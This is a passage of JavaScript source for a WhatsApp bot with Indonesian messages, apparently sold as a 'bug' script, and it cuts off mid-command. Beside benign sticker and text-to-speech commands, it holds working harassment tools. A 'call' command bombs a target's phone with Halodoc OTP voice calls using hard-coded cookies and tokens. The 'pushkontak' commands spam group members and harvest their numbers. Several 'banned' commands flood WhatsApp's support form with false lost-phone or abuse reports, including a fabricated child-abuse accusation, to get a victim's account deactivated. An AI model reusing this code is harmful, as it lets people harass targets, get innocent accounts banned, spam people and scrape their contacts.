"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb Rafathar Bug🔥`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@rafatharoffcial", 
"sourceUrl": "https://youtube.com/@rafatharoffcial" }}}, { quoted: m })
}
break
// LAST DI ATAS
case "tts": case "gtts":{
if (!q) return reply(` contoh : ${prefix+command} yamate kudasai`)
reply(mess.wait)
const gtts = require("./all/gtts")(`id`, q)
var bby = args.join(' ')
ranm = getRandom('.mp3')
rano = getRandom('.ogg')
bby.length > 300 ? reply('Teks nya terlalu panjang kak')
: gtts.save(ranm, bby, function () {
exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
fs.unlinkSync(ranm)
buff = fs.readFileSync(rano)
if (err) return reply(mess.error)
Biiofc.sendMessage(from, { audio: buff, mimetype: "audio/mp4", ptt: false },{ quoted: m })
fs.unlinkSync(rano)
})
})
}
break
case 's': case 'sticker': case 'stiker': {
if (!quoted) return reply(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await Biiofc.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })

} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds')
let media = await quoted.download()
let encmedia = await Biiofc.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })

} else {
reply(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
}
}
break
case "qc": {
if (!quoted){
const getname = await Biiofc.getName(mentionUser[0])
const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#FFFFFF",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": getname,
"photo": {
"url": ppuser
}
},
"text": quotedMsg.chats,
"replyMessage": {}
}
]
};
const response = axios.post('https://bot.lyo.su/quote/generate', json, {
headers: {'Content-Type': 'application/json'}
}).then(res => {
const buffer = Buffer.from(res.data.result.image, 'base64')
const opt = { packname: global.packname, author: global.author }
Biiofc.sendStimg(from, buffer, m, opt)
});
} else if (q) {
const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#FFFFFF",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": pushname,
"photo": {
"url": ppuser
}
},
"text": q,
"replyMessage": {}
}
]
};
const response = axios.post('https://bot.lyo.su/quote/generate', json, {
headers: {'Content-Type': 'application/json'}
}).then(res => {
const buffer = Buffer.from(res.data.result.image, 'base64')
const opt = { packname: global.packname, author: global.author }
Biiofc.sendStimg(from, buffer, m, opt)
});
} else {
reply(`Kirim perintah ${prefix+command} text atau reply pesan dengan perintah ${prefix+command}`)
}
}
break
case "owner": {
const repf = await Biiofc.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Kontak`, 
contacts: list }, contextInfo: {
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid: [sender]
}}, { quoted: m })
Biiofc.sendMessage(from, { text : `Hai Kak @${sender.split("@")[0]}, Nih Owner Ku Kak Kalo Mau Beli Sc ini Pm aja Ya https://chat.whatsapp.com/JzXpGWhy6FT0B3evbjYiA9`, contextInfo:{
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid:[sender]
}}, { quoted: repf })
}
break
case "call":
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} +6283183432283`)
await reply(mess.wait)
let nosend = "+" + q.split("|")[0].replace(/[^0-9]/g, '')
axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`${nosend}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}}).then(function (response) {reply(`${JSON.stringify(response.data, null, 2)}`)}).catch(function (error) {reply(`${JSON.stringify(error, null, 2)}`)})
break
case 'addtesti':{
if (!isOwner) return reply(mess.owner)
if (args.length < 1) return reply('Apa nama testinya?')
if (testimoni.includes(q)) return reply("Nama tersebut sudah digunakan")
let delb = await Biiofc.downloadAndSaveMediaMessage(quoted)
testimoni.push(q)
await fsx.copy(delb, `./database/image/${q}.jpg`)
fs.writeFileSync('./database/testimoni.json', JSON.stringify(testimoni))
fs.unlinkSync(delb)
reply(`Sukses Menambakan Testimoni\nCek Dengan Mengetik ${prefix}testimoni`)
}
break
case 'deltesti':{
if (!isOwner) return reply(mess.owner)
if (args.length < 1) return reply('Masukkan nama gambar')
if (!testimoni.includes(q)) return reply("Namanya tidak ada di database")
let wanu = testimoni.indexOf(q)
testimoni.splice(wanu, 1)
fs.writeFileSync('./database/testimoni.json', JSON.stringify(testimoni))
fs.unlinkSync(`./database/image/${q}.jpg`)
reply(`Sukses Delete Testi ${q}`)
}
break
case 'testimoni':{
let teks = '┌──⭓「 *testi List* 」\n│\n'
for (let x of testimoni) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${testimoni.length}*`
reply(teks)
}
break
case "addowner":
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await Biiofc.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
ownerNumber.push(bnnd)
fs.writeFileSync('./all/database/owner.json', JSON.stringify(ownerNumber))
reply(`Nomor ${bnnd} Telah Menjadi Owner!!!`)
break
case "delowner":
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = ownerNumber.indexOf(ya)
ownerNumber.splice(unp, 1)
fs.writeFileSync('./all/database/owner.json', JSON.stringify(ownerNumber))
reply(`Nomor ${ya} Telah Di Hapus Owner!!!`)
break
case 'listpremium': case 'listprem':
teks = '*Premium List*\n\n'
for (let Biiofc of prem) {
teks += `- ${Biiofc}\n`
}
teks += `\n*Total : ${prem.length}*`
Biiofc.sendMessage(m.chat, { text: teks.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": prem } })
break
case 'addprem':{
if (!isOwner) return m.reply(mess.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} Penggunaan :\n*#addprem* @tag waktu\n*#addprem* nomor waktu\n\nContoh : #addprem @tag 30d`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync("./database/premium.json", JSON.stringify(prem))
reply(`Nomor ${prrkek} Telah Menjadi Premium!`)
}
break
case "delprem":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync("./database/premium.json", JSON.stringify(prem))
reply(`Nomor ${ya} Telah Di Hapus Premium!`)
}
break
case "cekidgc": {
if (!isPremium && !isOwner) return reply(mess.only.premium)
let getGroups = await Biiofc.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *LIST GROUP DI BAWAH*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await Biiofc.groupMetadata(x)
teks += `◉ Nama : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
}
reply(teks + `Untuk Penggunaan Silahkan Ketik Command ${prefix}pushkontak id|teks\n\nSebelum Menggunakan Silahkan Salin Dulu Id Group Nya Di Atas`)
}
break
case "pushkontak":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (isGroup) return reply(mess.only.private)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup|tekspushkontak\nUntuk Liat Id Group Silahkan Ketik .cekidgc`)
reply(mess.wait)
const groupMetadataa = !isGroup? await Biiofc.groupMetadata(`${text.split("|")[0]}`).catch(e => {}) : ""
const participants = !isGroup? await groupMetadataa.participants : ""
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkon = text.split("|")[1]
if (isContacts) return
for (let mem of halls) {
if (isContacts) return
contacts.push(mem)
fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
if (/image/.test(mime)) {
media = await Biiofc.downloadAndSaveMediaMessage(quoted)
memk = await uptotelegra(media)
await Biiofc.sendMessage(mem, { image: { url: memk }, caption: global.tekspushkon })
await sleep(1000)
} else {
await Biiofc.sendMessage(mem, { text: global.tekspushkon })
await sleep(1000)
}
}
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(1)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await Biiofc.sendMessage(from, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Nih Kak Tinggal Pencet File Di Atas Terus Save", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
}
}
break
case "pushkontakv2":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!isGroup) return reply(mess.only.group)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} teks`)
reply(mess.wait)
const groupMetadata = isGroup? await Biiofc.groupMetadata(from).catch(e => {}) : ""
const groupOwner = isGroup? groupMetadata.owner : ""
const participantts = isGroup? await groupMetadata.participants : ""
const halsss = await participantts.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv2 = text
if (isContacts) return
for (let men of halsss) {
contacts.push(men)
fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
if (/image/.test(mime)) {
media = await Biiofc.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await Biiofc.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv2 })
await sleep(1000)
} else {
await Biiofc.sendMessage(men, { text: global.tekspushkonv2 })
await sleep(1000)
}
}
reply("File Kontak Sudah Di Kirim Lewat Chat Pribadi")
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(1)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await Biiofc.sendMessage(sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Nih Kak Tinggal Pencet File Di Atas Terus Save", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
}
}
break
case "out": case "verif":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv1": case "kenon":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Hello, please deactivate this number, because I have lost my cellphone and someone is using my number, please deactivate my number")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv2": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Porfavor, desative o número da minha conta, o chip e os documentos foram roubados essa conta possuí dados importante, então, por favor desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv3": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/Roubado: Por favor, desative minha conta\n\nOlá, por favor desative este número, pois perdi meu celular e alguém está usando meu número, por favor desative meu número")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv4": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "UM DE SEUS USUÁRIOS, ESTA USANDO O APK DO WHATSAPP FEITO POR TERCEIROS E ESTA INDO CONTRA OS TERMOS DE SERVIÇO PEÇO QUE ANALISEM ESSE USUÁRIO")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv5": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "مرحبًا ، يرجى إلغاء تنشيط هذا الرقم ، لأنني فقدت هاتفي وشخص ما يستخدم رقمي ، يرجى إلغاء تنشيط رقمي")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv6": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Esse número vem fazendo discurso ao ódio e divulgado conteúdo de porno infantil Numero")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "unbannedv1": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Hello WhatsApp team, recently my WhatsApp number was suddenly blocked and I couldnt log into my account, in my account there is an important group like a school group and I have to read it but the account My WhatsApp is suddenly blocked, please restore my numbers")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "unbannedv2": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Equipe, o sistema de vocês baniram meu número por engano. Peço que vocês reativem meu número pois tenho família em outro país e preciso me comunicar com eles")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "unbannedv3": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
